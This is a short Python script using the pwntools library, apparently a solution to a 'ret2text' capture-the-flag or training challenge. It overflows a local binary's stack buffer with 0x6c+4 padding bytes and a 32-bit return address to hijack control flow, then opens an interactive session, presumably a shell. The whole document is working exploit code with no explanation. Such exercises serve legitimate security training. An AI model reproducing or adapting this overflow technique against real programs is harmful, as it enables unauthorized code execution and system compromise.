from pwn import *

shell = process('./ret2text')
target_addr = 0x804863a
shell.sendline(b'a' * (0x6c+4) + p32(target_addr))
shell.interactive()